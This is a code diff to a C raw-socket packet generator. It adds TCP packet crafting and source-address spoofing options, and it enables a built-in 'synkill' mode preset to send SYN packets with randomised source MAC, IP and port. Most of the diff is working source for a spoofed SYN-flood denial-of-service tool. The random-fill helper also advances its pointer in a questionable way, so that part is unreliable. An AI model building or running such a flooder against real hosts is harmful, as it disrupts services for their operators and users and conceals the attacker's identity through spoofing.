@@ -11,7 +11,6 @@ char license[]={
 	"https://www.gnu.org/licenses/gpl-3.0.txt\n"
 #endif
 };
-#include <stdio.h>
 #include <sys/syscall.h>
 #include <linux/futex.h>
 #include <string.h>
@@ -19,8 +18,10 @@ char license[]={
 #include <arpa/inet.h>
 #include <netinet/ip.h>
 #include <netinet/ether.h>
-#include <netinet/ip_icmp.h>
+#include <linux/icmp.h>
+#include <linux/tcp.h>
 #include <unistd.h>
+#include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <errno.h>
@@ -41,19 +42,28 @@ char license[]={
 #define wakef(uaddr,val) syscall(SYS_futex,uaddr,FUTEX_WAKE,val,NULL,NULL,0)
 #define MAX_NPROCESS 16
 #define MAX_HIDDEN_ERRORS 128
-#define TSTACK_SIZE (8192)
+#define TSTACK_SIZE 8192
 #define INPUT_SIZE 1024
 struct argandret{
 	long id,tid;
 	unsigned long sent,sent_ok,sent_size,aborted,nerror;
 	long end;
 	uint32_t mutex;
-	uint16_t icmp_seqc,icmp_idc,ip_idc;
+	struct in_addr ip_src,ip_dst;
+	char mac_src[ETH_ALEN],mac_dst[ETH_ALEN];
+	uint32_t tcp_seq;
+	uint16_t icmp_seqn,icmp_idn,port_dst,port_src,ip_id,tcp_window;
 };
-enum vlmode {INC,RAND,DEC,FIX} icmp_seqmode=INC,icmp_idmode=FIX,ip_idmode=INC;
+struct pseudohdr{
+	struct in_addr saddr;
+	struct in_addr daddr;
+	uint8_t zero;
+	uint8_t protocol;
+	__be16 len;
+};
 enum {TYPE_AUTO,TYPE_RAW,TYPE_DGRAM} icmp_sock_type=TYPE_AUTO;
 enum {CHECK_AUTO,CHECK_SELECT,CHECK_EPOLL,CHECK_NO,CHECK_NONE} check_mode=CHECK_NONE;
-enum __proto {P_NONE,P_RAW,P_ETHER,P_IP,P_IP6,P_ICMP,P_ICMP6,P_UDP} base_proto=P_NONE;
+enum __proto {P_NONE,P_RAW,P_ETHER,P_IP,P_IP6,P_ICMP,P_ICMP6,P_UDP,P_TCP} base_proto=P_NONE;
 enum __proto upper_proto=P_ICMP;
 struct timespec ts;
 //int sock_domain,sock_protocol;
@@ -66,7 +76,7 @@ char mac_s[ETH_ALEN],mac_s_c=0,mac_t[ETH_ALEN],mac_t_c=0,ip_ttl=64,ip_tlen;
 end packet option*/
 char sleep_between_sents=0,running,count_written=0,update_ok=1,recv_pack=0,epet=0;
 char *target=NULL,*source=NULL,*bind_device=NULL,*data_from_file=NULL,*tstack;
-size_t packlen,data_size=0,sent_sum=0,sent_sum_ok=0,count=0,sent_sum_size=0,aborted_sum=0,nerror_sum=0,sndbuf=0,nnetdown=0;
+size_t packlen,data_size=0,sent_sum=0,sent_sum_ok=0,count=0,sent_sum_size=0,aborted_sum=0,nerror_sum=0,sndbuf=0,nnetdown=0,nnetunreach=0;
 void (*phdr[MAX_NPROCESS])(void *s,size_t offset,struct argandret *aar);
 size_t (*fhdr[MAX_NPROCESS])(void *s,size_t offset,struct argandret *aar);
 size_t offsets[MAX_NPROCESS];
@@ -89,6 +99,7 @@ struct timespec cts;
 struct timespec *pcts=NULL;
 //struct timeval *pctv=NULL;
 char ifname[IFNAMSIZ];
+char *synkill_args[]={"synkill","--mac-src-rand","--ip-src-rand","--src-port-rand","-ET","--tcp-flag","s","--ip-id-rand","--tcp-window-rand",NULL};
 //#define epoll_create(x) (-1)
 //#define epoll_ctl(x,y,z,t) (-1)
 //#define clone(x,y,z,t) (-1)
@@ -268,13 +279,38 @@ char *b2hu(size_t byte,char *out){
 uint16_t cksum(const void *s,size_t n){
 	uint32_t sum=0;
 	const uint16_t *p=(const uint16_t *)s;
+	union {
+		uint8_t c[2];
+		uint16_t s;
+	} v;
 	while(n>1){
 		sum+=*p++;
 		n-=2;
 	}
-	if(n)sum+=(uint16_t)*(uint8_t *)p;
-	sum=(sum>>16)+(sum&0xffff);
-	return ~sum;
+	if(n){
+		v.c[0]=*p;
+		v.c[1]=0;
+		sum+=v.s;
+	}
+	return ~(uint16_t)((sum>>16)+(sum&0xffff));
+}
+uint32_t cksum_raw(const void *s,size_t n){
+	uint32_t sum=0;
+	const uint16_t *p=(const uint16_t *)s;
+	union {
+		uint8_t c[2];
+		uint16_t s;
+	} v;
+	while(n>1){
+		sum+=*p++;
+		n-=2;
+	}
+	if(n){
+		v.c[0]=*p;
+		v.c[1]=0;
+		sum+=v.s;
+	}
+	return sum;
 }
 int sockerr(int fd){
 	socklen_t optlen;
@@ -323,42 +359,52 @@ void memrand(void *restrict m,size_t n){
 #if (RAND_MAX>=UINT32_MAX)
 	while(n>=4){
 		*(uint32_t *)m=(uint32_t)rand();
+		*(char *)&m+=4;
 		n-=4;
 	}
 #endif
 #if (RAND_MAX>=UINT16_MAX)
 	while(n>=2){
 		*(uint16_t *)m=(uint16_t)rand();
+		*(char *)&m+=2;
 		n-=2;
 	}
 #endif
 	while(n>0){
 		*(uint8_t *)m=(uint8_t)rand();
+		*(char *)&m+=1;
 		--n;
 	}
 
 }
+enum vlmode {INC,RAND,DEC,FIX} icmp_seqmode=INC,icmp_idmode=FIX,ip_idmode=INC,port_srcmode=FIX,port_dstmode=FIX,tcp_seqmode=RAND,tcp_windowmode=FIX,mac_srcmode=FIX,ip_srcmode=FIX;
+uint32_t tcp_seq=0;
 uint16_t icmp_seq0=0,icmp_type=ICMP_ECHO,icmp_echoid=0;
-uint16_t port_t=0,port_s=0,eth_protocol=0,ip_id=0,ip_tlen=0;
+uint16_t port_t=0,port_s=0,eth_protocol=0,ip_id=0,ip_tlen=0,tcp_window=512;
 struct in_addr ip_addr_t,ip_addr_s;
-uint8_t mac_s[ETH_ALEN],mac_s_c=0,mac_t[ETH_ALEN],mac_t_c=0,ip_addr_t_c=0,ip_addr_s_c=0,ip_ttl=IPDEFTTL,ip_protocol=0,icmp_seq_fillrand=0,icmp_id_fillrand=1,ip_id_fillrand=1;
+uint8_t mac_s[ETH_ALEN],mac_s_c=0,mac_t[ETH_ALEN],mac_t_c=0,ip_addr_t_c=0,ip_addr_s_c=0,ip_ttl=IPDEFTTL,ip_protocol=0,icmp_seq_fillrand=0,icmp_id_fillrand=1,ip_id_fillrand=1,port_dst_fillrand=0,port_src_fillrand=1,tcp_seq_fillrand=0;
+char *tcp_flag;
 size_t fill_icmphdr(void *s,size_t offset,struct argandret *aar){
 	struct icmphdr *h;
 	h=(struct icmphdr *)((char *)s+offset);
 	h->type=icmp_type;
-	if(icmp_seq_fillrand)memrand(&aar->icmp_seqc,sizeof(uint16_t));else
-	aar->icmp_seqc=icmp_seq0;
-	h->un.echo.sequence=htons(aar->icmp_seqc);
-	if(icmp_id_fillrand)memrand(&aar->icmp_idc,sizeof(uint16_t));else
-	aar->icmp_idc=icmp_echoid;
-	h->un.echo.id=htons(aar->icmp_idc);
+	if(icmp_seq_fillrand)memrand(&aar->icmp_seqn,sizeof(uint16_t));else
+	aar->icmp_seqn=icmp_seq0;
+	h->un.echo.sequence=htons(aar->icmp_seqn);
+	if(icmp_id_fillrand)memrand(&aar->icmp_idn,sizeof(uint16_t));else
+	aar->icmp_idn=icmp_echoid;
+	h->un.echo.id=htons(aar->icmp_idn);
 	return sizeof(*h);
 }
 size_t fill_ethhdr(void *s,size_t offset,struct argandret *aar){
 	struct ethhdr *h;
 	h=(struct ethhdr *)((char *)s+offset);
-	memcpy(&h->h_dest,mac_t,ETH_ALEN);
-	memcpy(&h->h_source,mac_s,ETH_ALEN);
+	memcpy(aar->mac_dst,mac_t,ETH_ALEN);
+	memcpy(h->h_dest,aar->mac_dst,ETH_ALEN);
+
+	memcpy(aar->mac_src,mac_s,ETH_ALEN);
+	memcpy(h->h_source,aar->mac_src,ETH_ALEN);
+
 	h->h_proto=htons(eth_protocol);
 	return sizeof(struct ethhdr);
 }
@@ -369,38 +415,185 @@ size_t fill_iphdr(void *s,size_t offset,struct argandret *aar){
 	h->ihl=sizeof(struct iphdr)/4;
 	h->tos=0;
 	h->tot_len=htons(ip_tlen);
-	if(ip_id_fillrand)memrand(&aar->ip_idc,sizeof(uint16_t));else
-	aar->ip_idc=ip_id;
-	h->id=htons(aar->ip_idc);
+	if(ip_id_fillrand)memrand(&aar->ip_id,sizeof(uint16_t));else
+	aar->ip_id=ip_id;
+	h->id=htons(aar->ip_id);
 	h->frag_off|=htons(IP_DF);
 	h->ttl=ip_ttl;
 	h->protocol=ip_protocol;
-	memcpy(&h->saddr,&ip_addr_s,sizeof(h->saddr));
-	memcpy(&h->daddr,&ip_addr_t,sizeof(h->daddr));
+	memcpy(&aar->ip_src,&ip_addr_s,sizeof(h->saddr));
+	memcpy(&h->saddr,&aar->ip_src,sizeof(h->saddr));
+	memcpy(&aar->ip_dst,&ip_addr_t,sizeof(h->daddr));
+	memcpy(&h->daddr,&aar->ip_dst,sizeof(h->daddr));
 	h->check=0;
 	h->check=cksum(h,sizeof(*h));
 	return sizeof(*h);
 }
-void process_ethhdr(void *s,size_t offset,struct argandret *aar){}
+size_t fill_tcphdr(void *s,size_t offset,struct argandret *aar){
+	struct tcphdr *h;
+	char *p;
+	h=(struct tcphdr *)((char *)s+offset);
+	if(port_src_fillrand)memrand(&aar->port_src,sizeof(uint16_t));else
+		aar->port_src=port_s;
+	h->source=htons(aar->port_src);
+	if(port_dst_fillrand)memrand(&aar->port_dst,sizeof(uint16_t));else
+		aar->port_dst=port_t;
+	h->dest=htons(aar->port_dst);
+	h->doff=sizeof(struct tcphdr)/4;
+	aar->tcp_window=tcp_window;
+	h->window=htons(aar->tcp_window);
+	p=tcp_flag;
+	while(p&&*p){
+		switch(*p|32){
+		case 's':
+			h->syn=1;
+			break;
+		case 'f':
+			h->fin=1;
+			break;
+		case 'r':
+			h->rst=1;
+			break;
+		case 'p':
+			h->psh=1;
+			break;
+		case 'a':
+			h->ack=1;
+			break;
+		case 'u':
+			h->urg=1;
+			break;
+		default:
+			break;
+	}
+	++p;
+	}
+	if(tcp_seq_fillrand)memrand(&aar->tcp_seq,sizeof(uint32_t));else
+		aar->tcp_seq=tcp_seq;
+	h->seq=htonl(aar->tcp_seq);
+
+	return sizeof(*h);
+}
+void process_tcphdr(void *s,size_t offset,struct argandret *aar){
+	struct tcphdr *h;
+	struct pseudohdr ph;
+	uint32_t cr;
+//	char *p;
+	h=(struct tcphdr *)((char *)s+offset);
+	switch(port_srcmode){
+		case RAND:
+			memrand(&aar->port_src,sizeof(uint16_t));
+			break;
+		case FIX:
+			break;
+		case INC:
+			++aar->port_src;
+			break;
+		case DEC:
+			--aar->port_src;
+			break;
+		default:
+			break;
+	}
+	h->source=htons(aar->port_src);
+	switch(port_dstmode){
+		case RAND:
+			memrand(&aar->port_dst,sizeof(uint16_t));
+			break;
+		case FIX:
+			break;
+		case INC:
+			++aar->port_dst;
+			break;
+		case DEC:
+			--aar->port_dst;
+			break;
+		default:
+			break;
+	}
+	h->dest=htons(aar->port_dst);
+	switch(tcp_seqmode){
+		case RAND:
+			memrand(&aar->tcp_seq,sizeof(uint32_t));
+			break;
+		case FIX:
+			break;
+		case INC:
+			++aar->tcp_seq;
+			break;
+		case DEC:
+			--aar->tcp_seq;
+			break;
+		default:
+			break;
+	}
+	h->seq=htonl(aar->tcp_seq);
+	switch(tcp_windowmode){
+		case RAND:
+			memrand(&aar->tcp_window,sizeof(uint16_t));
+			break;
+		case FIX:
+			break;
+		case INC:
+			++aar->tcp_window;
+			break;
+		case DEC:
+			--aar->tcp_window;
+			break;
+		default:
+			break;
+	}
+	h->window=htons(aar->tcp_window);
+
+	memcpy(&ph.saddr,&aar->ip_src,sizeof(struct in_addr));
+	memcpy(&ph.daddr,&aar->ip_dst,sizeof(struct in_addr));
+	ph.protocol=IPPROTO_TCP;
+	ph.zero=0;
+	ph.len=htons(sizeof(*h)+data_size);
+	h->check=0;
+	cr=cksum_raw(h,sizeof(*h)+data_size)+cksum_raw(&ph,sizeof(ph));
+	cr=(cr>>16)+(cr&0xffff);
+	h->check=~(uint16_t)cr;
+}
+void process_ethhdr(void *s,size_t offset,struct argandret *aar){
+	struct ethhdr *h;
+	h=(struct ethhdr *)((char *)s+offset);
+	switch(mac_srcmode){
+		case RAND:
+			memrand(aar->mac_src,ETH_ALEN);
+			break;
+		default:
+			break;
+	}
+	memcpy(h->h_source,aar->mac_src,ETH_ALEN);
+}
 void process_iphdr(void *s,size_t offset,struct argandret *aar){
 	struct iphdr *h;
 	h=(struct iphdr *)((char *)s+offset);
 	switch(ip_idmode){
 		case RAND:
-			aar->ip_idc=(uint16_t)rand();
+			memrand(&aar->ip_id,sizeof(uint16_t));
 			break;
 		case FIX:
 			break;
 		case INC:
-			++aar->ip_idc;
+			++aar->ip_id;
 			break;
 		case DEC:
-			--aar->ip_idc;
+			--aar->ip_id;
 			break;
 		default:
 			break;
 	}
-	h->id=htons(aar->ip_idc);
+	h->id=htons(aar->ip_id);
+	switch(ip_srcmode){
+		case RAND:
+			memrand(&aar->ip_src,sizeof(struct in_addr));
+			break;
+		default:
+			break;
+	}
+	memcpy(&h->saddr,&aar->ip_src,sizeof(struct in_addr));
 	h->check=0;
 	h->check=cksum(h,sizeof(*h));
 
@@ -410,36 +603,36 @@ void process_icmphdr(void *s,size_t offset,struct argandret *aar){
 	h=(struct icmphdr *)((char *)s+offset);
 	switch(icmp_seqmode){
 		case RAND:
-			aar->icmp_seqc=(uint16_t)rand();
+			memrand(&aar->icmp_seqn,sizeof(uint16_t));
 			break;
 		case FIX:
 			break;
 		case INC:
-			++aar->icmp_seqc;
+			++aar->icmp_seqn;
 			break;
 		case DEC:
-			--aar->icmp_seqc;
+			--aar->icmp_seqn;
 			break;
 		default:
 			break;
 	}
 	switch(icmp_idmode){
 		case RAND:
-			aar->icmp_idc=(uint16_t)rand();
+			memrand(&aar->icmp_idn,sizeof(uint16_t));
 			break;
 		case FIX:
 			break;
 		case INC:
-			++aar->icmp_idc;
+			++aar->icmp_idn;
 			break;
 		case DEC:
-			--aar->icmp_idc;
+			--aar->icmp_idn;
 			break;
 		default:
 			break;
 	}
-	h->un.echo.sequence=htons(aar->icmp_seqc);
-	h->un.echo.id=htons(aar->icmp_idc);
+	h->un.echo.sequence=htons(aar->icmp_seqn);
+	h->un.echo.id=htons(aar->icmp_idn);
 	h->checksum=0;
 	h->checksum=cksum(h,sizeof(*h));
 }
@@ -492,6 +685,7 @@ union {
 	struct sockaddr_in in;
 	struct sockaddr_ll ll;
 } uaddr;
+struct argandret *aar;
 void *sbuf;
 struct timespec ts_old,ts_new,ts_use;
 struct epoll_event epevent;
@@ -499,8 +693,8 @@ ssize_t r;
 socklen_t rs;
 char inputp[INPUT_SIZE];
 long id;
-size_t sent=0,sent_ok=0,sent_size=0,aborted=0,nerror=0;
 int fd,lasterr=0,r0,r1,epfd,r2;
+aar=(struct argandret *)arg;
 memset(&uaddr,0,sizeof(uaddr));
 id=((struct argandret *)arg)->id;
 switch(base_proto){
@@ -597,7 +791,7 @@ switch(base_proto){
 	}
 	fcntl(fd,F_SETFL,fcntl(fd,F_GETFL)|O_NONBLOCK);
 	uaddr.ll.sll_family=AF_PACKET;
-//	uaddr.ll.sll_protocol=0;
+//	uaddr.ll.sll_protocol=htons(ETH_P_ALL);
 		r0=ifname2index(fd,bind_device?bind_device:ifname);
 		if(r0<0){
 		r1=sprintf(inputp,"%ld: cannot find device (%s):%s \n",id,bind_device,strerror(-r0));
@@ -693,11 +887,11 @@ while(running){
 	if(check_mode!=CHECK_NO){
 		if(!(r2=checksockfd(fd,epfd,&r0)))goto noerr;
 		if(r2>0){
-			if(!epet||r2==1)++aborted;
-		}else if(r0!=EINTR||running)++nerror;
+			if(!epet||r2==1)++aar->aborted;
+		}else if(r0!=EINTR||running)++aar->nerror;
 		else goto no_show_err;
 		if(lasterr!=r0&&(r0=newerr(r0))){
-			r1=sprintf(inputp,"\n%ld: %s before writing %lu th packet:%s (same errors following will be hidden)\n",id,r2>0?"error avoided":"cannot check",sent,strerror(r0));
+			r1=sprintf(inputp,"\n%ld: %s before writing %lu th packet:%s (same errors following will be hidden)\n",id,r2>0?"error avoided":"cannot check",aar->sent,strerror(r0));
 			write(STDERR_FILENO,inputp,r1);
 			lasterr=errno;
 		}
@@ -708,13 +902,14 @@ no_show_err:
 noerr:
 	if(!update_ok||r>=0)proc_all(sbuf,arg);
 	r=write(fd,sbuf,packlen);
-	++sent;
+	++aar->sent;
 	if(r<0){
 		r0=errno;
-		++nerror;
-		if(r0==ENETDOWN&&running){
+		++aar->nerror;
+		if((r0==ENETDOWN||r0==ENETUNREACH)&&running){
 			pthread_mutex_lock(&gmutex);
-			r1=sprintf(inputp,"\n%ld: ENETDOWN at writing %lu th packet (%lu times),sleep\n",id,sent,++nnetdown);
+			if(r0==ENETDOWN)r1=sprintf(inputp,"\n%ld: ENETDOWN at writing %lu th packet (%lu times),sleep\n",id,aar->sent,++nnetdown);
+			else r1=sprintf(inputp,"\n%ld: ENETUNREACH at writing %lu th packet (%lu times),sleep\n",id,aar->sent,++nnetunreach);
 			write(STDERR_FILENO,inputp,r1);
 			pthread_mutex_unlock(&gmutex);
 			nanosleep(&cts,NULL);
@@ -723,15 +918,15 @@ noerr:
 
 //		if((r0!=EWOULDBLOCK&&r0!=EAGAIN)||!epet){
 		if(lasterr!=r0&&(r0=newerr(r0))){
-			r1=sprintf(inputp,"\n%ld: error at writing %lu th packet:%s (same errors following will be hidden)\n",id,sent,strerror(r0));
+			r1=sprintf(inputp,"\n%ld: error at writing %lu th packet:%s (same errors following will be hidden)\n",id,aar->sent,strerror(r0));
 			write(STDERR_FILENO,inputp,r1);
 			lasterr=errno;
 		}
 //	}else --sent;
 	}
 	else {
-	++sent_ok;
-	sent_size+=r;
+	++aar->sent_ok;
+	aar->sent_size+=r;
 	//fprintf(stderr,"%hu\n",icmp_seqc);
 	}
 	if(sleep_between_sents){
@@ -757,9 +952,9 @@ noerr:
 	}
 	if(count){
 		if(count_written){
-		if(sent_ok>=count)break;
+		if(aar->sent_ok>=count)break;
 		}else {
-		if(sent>=count)break;
+		if(aar->sent>=count)break;
 		}
 
 	}
@@ -770,11 +965,6 @@ if(epfd>=0){
 	close(epfd);
 }
 close(fd);
-((struct argandret *)arg)->sent=sent;
-((struct argandret *)arg)->sent_ok=sent_ok;
-((struct argandret *)arg)->sent_size=sent_size;
-((struct argandret *)arg)->aborted=aborted;
-((struct argandret *)arg)->nerror=nerror;
 pthread_mutex_lock(&gmutex);
 free(sbuf);
 pthread_mutex_unlock(&gmutex);
@@ -1061,23 +1251,31 @@ int main(int argc,char **argv){
 	ssize_t r;
 	int fd;
 	struct in_addr iptmp;
+	char **argv0;
 	srand(time(NULL));
 	dat2spec("2.0",&cts);
+	argv0=argv;
 #ifdef RELEASE
 	if(strcmp(bfname(argv[0]),"synkill")==0)
 #else
 	if(strcmp(bfname(argv[0]),"synkill_g")==0||strcmp(bfname(argv[0]),"synkill")==0)
 #endif
 	{
-		errexit("will be supported in the future\n");
+		synkill_args[0]=argv[0];
+		argv=synkill_args;
+		goto main_arg;
+after_synkill_arg:
+		argv=argv0;
+		goto main_arg;
 	}
 	if(argc<2){
 		write(STDOUT_FILENO,"--help\n",7);
 		return 0;
 	}
-	for(i=1;i<argc;++i){
+main_arg:
+	for(i=1;argv[i];++i){
 		if(strcmp(argv[i],"--mac-dst")==0||strcmp(argv[i],"--eth-dst")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
@@ -1085,18 +1283,22 @@ int main(int argc,char **argv){
 			mac_t_c=1;
 			base_proto=P_ETHER;
 		}else if(strcmp(argv[i],"--mac-src")==0||strcmp(argv[i],"--eth-src")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			if(ether_aton_r(argv[++i],(struct ether_addr *)mac_s)==NULL)goto err_sarg;
 			mac_s_c=1;
 			base_proto=P_ETHER;
+		}else if(strcmp(argv[i],"--mac-src-rand")==0||strcmp(argv[i],"--eth-src-rand")==0){
+			mac_srcmode=RAND;
+			mac_s_c=1;
+			base_proto=P_ETHER;
 		}else if(strcmp(argv[i],"--help")==0){
-			write(STDOUT_FILENO,"usage\n",6);
+			write(STDOUT_FILENO,"see help.txt\n",13);
 			return 0;
 		}else if(strcmp(argv[i],"--license")==0){
-			write(STDOUT_FILENO,license,strlen(license));
+			write(STDOUT_FILENO,license,sizeof(license)-1);
 			return 0;
 		}else if(strcmp(argv[i],"--icmp")==0){
 			upper_proto=P_ICMP;
@@ -1109,7 +1311,7 @@ int main(int argc,char **argv){
 		}else if(strcmp(argv[i],"--icmp-seq-dec")==0){
 			icmp_seqmode=DEC;
 		}else if(strcmp(argv[i],"--icmp-seq")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
@@ -1125,7 +1327,7 @@ int main(int argc,char **argv){
 		}else if(strcmp(argv[i],"--icmp-id-rand")==0){
 			icmp_idmode=RAND;
 		}else if(strcmp(argv[i],"--icmp-id")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
@@ -1146,13 +1348,81 @@ int main(int argc,char **argv){
 			upper_proto=P_UDP;
 		}else if(strcmp(argv[i],"--packet")==0||strcmp(argv[i],"-P")==0){
 			base_proto=P_ETHER;
-		}else if(strcmp(argv[i],"-p")==0||strcmp(argv[i],"--port")==0||strcmp(argv[i],"--sin-port")==0){
-			if(i==argc-1){
+		}else if(strcmp(argv[i],"-p")==0||strcmp(argv[i],"--port")==0||strcmp(argv[i],"--dst-port")==0){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			r0=sscanf(argv[++i],"%hu",&port_t);
 			if(r0<1)goto err_sarg;
+			port_dst_fillrand=0;
+		}else if(strcmp(argv[i],"--src-port")==0){
+			if(!argv[i+1]){
+				fprintf(stderr,"no argument after %s\n",argv[i]);
+				errexit("Failed\n");
+			}
+			r0=sscanf(argv[++i],"%hu",&port_s);
+			if(r0<1)goto err_sarg;
+			port_src_fillrand=0;
+			port_srcmode=FIX;
+		}else if(strcmp(argv[i],"--dst-port-rand")==0){
+			port_dstmode=RAND;
+		}else if(strcmp(argv[i],"--dst-port-inc")==0){
+			port_dstmode=INC;
+		}else if(strcmp(argv[i],"--dst-port-dec")==0){
+			port_dstmode=DEC;
+		}else if(strcmp(argv[i],"--dst-port-fix")==0){
+			port_dstmode=FIX;
+		}else if(strcmp(argv[i],"--src-port-rand")==0){
+			port_srcmode=RAND;
+		}else if(strcmp(argv[i],"--src-port-inc")==0){
+			port_srcmode=INC;
+		}else if(strcmp(argv[i],"--src-port-dec")==0){
+			port_srcmode=DEC;
+		}else if(strcmp(argv[i],"--src-port-fix")==0){
+			port_srcmode=FIX;
+		}else if(strcmp(argv[i],"--tcp-flag")==0){
+			if(!argv[i+1]){
+				fprintf(stderr,"no argument after %s\n",argv[i]);
+				errexit("Failed\n");
+			}
+			tcp_flag=argv[++i];
+			upper_proto=P_TCP;base_proto=P_ETHER;
+		}else if(strcmp(argv[i],"--tcp")==0){
+			upper_proto=P_TCP;base_proto=P_ETHER;
+		}else if(strcmp(argv[i],"--tcp-seq-rand")==0){
+			tcp_seqmode=RAND;
+		}else if(strcmp(argv[i],"--tcp-seq-inc")==0){
+			tcp_seqmode=INC;
+		}else if(strcmp(argv[i],"--tcp-seq-dec")==0){
+			tcp_seqmode=DEC;
+		}else if(strcmp(argv[i],"--tcp-seq-fix")==0){
+			tcp_seqmode=FIX;
+		}else if(strcmp(argv[i],"--tcp-seq")==0){
+			if(!argv[i+1]){
+				fprintf(stderr,"no argument after %s\n",argv[i]);
+				errexit("Failed\n");
+			}
+			r0=sscanf(argv[++i],"%u",&tcp_seq);
+			if(r0<1)goto err_sarg;
+			tcp_seq_fillrand=0;
+			tcp_seqmode=FIX;
+		}else if(strcmp(argv[i],"--tcp-window-rand")==0){
+			tcp_windowmode=RAND;
+		}else if(strcmp(argv[i],"--tcp-window-inc")==0){
+			tcp_windowmode=INC;
+		}else if(strcmp(argv[i],"--tcp-window-dec")==0){
+			tcp_windowmode=DEC;
+		}else if(strcmp(argv[i],"--tcp-window-fix")==0){
+			tcp_windowmode=FIX;
+		}else if(strcmp(argv[i],"--tcp-window")==0){
+			if(!argv[i+1]){
+				fprintf(stderr,"no argument after %s\n",argv[i]);
+				errexit("Failed\n");
+			}
+			r0=sscanf(argv[++i],"%hu",&tcp_window);
+			if(r0<1)goto err_sarg;
+			tcp_windowmode=FIX;
 		}else if(strcmp(argv[i],"--raw")==0){
 			base_proto=P_RAW;
 		}else if(strcmp(argv[i],"--update-force")==0){
@@ -1165,7 +1435,7 @@ int main(int argc,char **argv){
 			check_mode=CHECK_SELECT;
 		}else if(strcmp(argv[i],"--check-epoll")==0){
 			check_mode=CHECK_EPOLL;
-		}else if(strcmp(argv[i],"-ET")==0||strcmp(argv[i],"--check-epollet")==0){
+		}else if(strcmp(argv[i],"-et")==0||strcmp(argv[i],"-ET")==0||strcmp(argv[i],"--check-epollet")==0){
 			check_mode=CHECK_EPOLL;
 			epet=1;
 		}else if(strcmp(argv[i],"--check-no")==0){
@@ -1173,20 +1443,20 @@ int main(int argc,char **argv){
 		}else if(strcmp(argv[i],"--recv")==0){
 			recv_pack=1;
 		}else if(strcmp(argv[i],"-s")==0||strcmp(argv[i],"--source")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			source=argv[++i];
 			base_proto=P_ETHER;
 		}else if(strcmp(argv[i],"-t")==0||strcmp(argv[i],"--target")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			target=argv[++i];
 		}else if(strcmp(argv[i],"-i")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
@@ -1195,7 +1465,7 @@ int main(int argc,char **argv){
 			base_proto=P_ETHER;
 			upper_proto=P_IP;
 		}else if(strcmp(argv[i],"--ip-dst")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
@@ -1204,12 +1474,16 @@ int main(int argc,char **argv){
 			ip_addr_t_c=1;
 			base_proto=P_ETHER;
 		}else if(strcmp(argv[i],"--ip-src")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			r0=inet_aton(argv[++i],&ip_addr_s);
 			if(r0<1)goto err_sarg;
+			ip_addr_s_c=1;
+			base_proto=P_ETHER;
+		}else if(strcmp(argv[i],"--ip-src-rand")==0){
+			ip_srcmode=RAND;
 			ip_addr_s_c=1;
 			base_proto=P_ETHER;
 		}else if(strcmp(argv[i],"--ip-id-inc")==0){
@@ -1221,15 +1495,16 @@ int main(int argc,char **argv){
 		}else if(strcmp(argv[i],"--ip-id-rand")==0){
 			ip_idmode=RAND;
 		}else if(strcmp(argv[i],"--ip-id")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			r0=sscanf(argv[++i],"%hu",&ip_id);
 			if(r0<1)goto err_sarg;
 			ip_id_fillrand=0;
+			base_proto=P_ETHER;
 		}else if(strcmp(argv[i],"--ip-ttl")==0||strcmp(argv[i],"-TTL")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
@@ -1237,7 +1512,7 @@ int main(int argc,char **argv){
 			if(r0<1)goto err_sarg;
 			base_proto=P_ETHER;
 		}else if(strcmp(argv[i],"-cw")==0||strcmp(argv[i],"--count-written")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}			
@@ -1245,7 +1520,7 @@ int main(int argc,char **argv){
 			if(r0<1)goto err_sarg;
 			count_written=1;
 		}else if(strcmp(argv[i],"-c")==0||strcmp(argv[i],"--count")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
@@ -1253,7 +1528,7 @@ int main(int argc,char **argv){
 			if(r0<1)goto err_sarg;
 			count_written=0;
 		}else if(strcmp(argv[i],"--timeout")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
@@ -1265,41 +1540,41 @@ int main(int argc,char **argv){
 			pcts=&cts;
 			//pctv=&ctv;
 		} else if(strcmp(argv[i],"--thread")==0||strcmp(argv[i],"-T")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			r0=sscanf(argv[++i],"%ld",&nthreads);
 			if(r0<1)goto err_sarg;
 		}else if(strcmp(argv[i],"--alarm")==0||strcmp(argv[i],"--alrm")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			r0=sscanf(argv[++i],"%u",&do_alarm);
 			if(r0<1)goto err_sarg;
